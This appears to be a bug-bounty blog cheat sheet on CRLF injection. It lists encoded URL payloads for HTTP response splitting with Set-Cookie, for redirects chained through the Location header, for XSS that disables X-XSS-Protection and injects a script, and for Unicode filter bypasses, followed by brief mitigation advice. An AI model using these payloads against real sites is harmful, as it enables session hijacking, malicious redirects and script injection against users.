# CRLF Injection

#### Getting Started <a href="#id-47d9" id="id-47d9"></a>

**Now, What is CRLF?**

```sh
feed = \n (%0a)
Carriage Return = \r (%0d)
```

Basically, Pressing Enter key is the combination of carriage return & line feed

Windows Editor mostly uses a combination of \r\n Unix uses mostly&#x20;

**Diggin' into Injection and Attack Vector**

### **What is CRLF Injection?**

A Carriage Return Line Feed (CRLF) Injection vulnerability occurs when an application does not sanitize user input correctly and allows for the insertion of carriage returns and line feeds, input which for many internet protocols, including HTML, denote line breaks and have special significance. For example, Parsing of HTTP message relies on CRLF characters (%0D%0A which decoded represent \r\n) to identify sections of HTTP messages, including headers. Reference:

The Effect of CRLF injection also includes HTTP Request smuggling and HTTP Response Splitting. ( Detailing about them is out of the scope of this Blog, Maybe will discuss it in next blog post)

As I went through reports and write-ups, I compiled a **cheat sheet for CRLF injection**, covering different exploitation techniques. This serves as a quick reference for identifying and leveraging CRLF vulnerabilities in web applications.

### CHEATSHEET <a href="#ca66" id="ca66"></a>

#### **1. HTTP Response Splitting**

HTTP response splitting occurs when an attacker injects CRLF (`%0D%0A`) into an HTTP response, allowing them to manipulate headers or inject new ones.

```http
/%0D%0ASet-Cookie:mycookie=myvalue
```

&#x20;This injects a `Set-Cookie` header, which can be exploited for session fixation or altering user sessions.

***

#### **2. CRLF Chained with Open Redirect**

By combining CRLF injection with an open redirect vulnerability, attackers can manipulate response headers and force users to malicious destinations.

```plaintext
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
/%0d%0aLocation:%20http://example.com
```

These payloads manipulate the `Location` header, forcing a redirection to an attacker-controlled site.

***

#### **3. CRLF Injection Leading to XSS**

CRLF injection can also be used to execute **Cross-Site Scripting (XSS)** attacks by injecting headers like `Content-Type` and disabling security protections.

```plaintext
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<script>alert(document.domain)</script>
```

The first payload **disables X-XSS-Protection**, while the second **injects a malicious script**, leading to XSS execution.

***

#### **4. Filter Bypass Techniques**

Some applications implement filters to prevent CRLF injection, but attackers can bypass these protections using encoded characters.

**Bypass Encoding:**

```
%E5%98%8A = %0A = \u560a
%E5%98%8D = %0D = \u560d
%E5%98%BE = %3E = \u563e (>)
%E5%98%BC = %3C = \u563c (<)
```

**Example Payload:**

```plaintext
%E5%98%8A%E5%98%8DSet-Cookie:%20test
```

These Unicode-encoded sequences **bypass input validation** and inject malicious headers.

### Result And Analysis <a href="#a319" id="a319"></a>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sxQ0fSfdQY1Je8Ag18Tl1Q.png" alt=""><figcaption></figcaption></figure>

Most of the CRLF injection can lead to XSS and Open Redirects if chained properly which increases the Criticality of the report and you can escalate your report to Medium CVS score easily

### Mitigation or Fix Implementation <a href="#id-3f5c" id="id-3f5c"></a>

A simple solution for CRLF Injection is to sanitize the CRLF characters before passing into the header or to encode the data which will prevent the CRLF sequences from entering the header.

#### Payloads <a href="#id-729c" id="id-729c"></a>

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection>

<https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt>
